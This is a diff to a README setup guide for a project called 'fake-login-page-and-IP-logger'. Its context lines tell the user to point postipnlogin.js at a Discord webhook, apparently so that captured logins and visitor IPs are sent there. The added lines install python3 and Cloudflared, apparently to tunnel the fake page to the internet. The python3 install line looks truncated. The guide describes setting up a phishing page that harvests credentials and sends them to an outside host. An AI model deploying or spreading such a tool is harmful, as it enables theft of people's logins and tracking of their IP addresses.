@@ -19,7 +19,15 @@ cd fake-login-page-and-IP-logger
 * edit line 18 in postipnlogin.js to your discord webhook
 ```
 ### 3. Install dependencies
+**3.1. python3**
 ```bash
+sudo apt update
+sudo apt install python3 python3-p
+```
+**3.2. Cloudflared**
+```bash
+wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
+sudo dpkg -i cloudflared-linux-amd64.deb
 ```
 ### 4. Temporarily bring the login page up
 ```bash
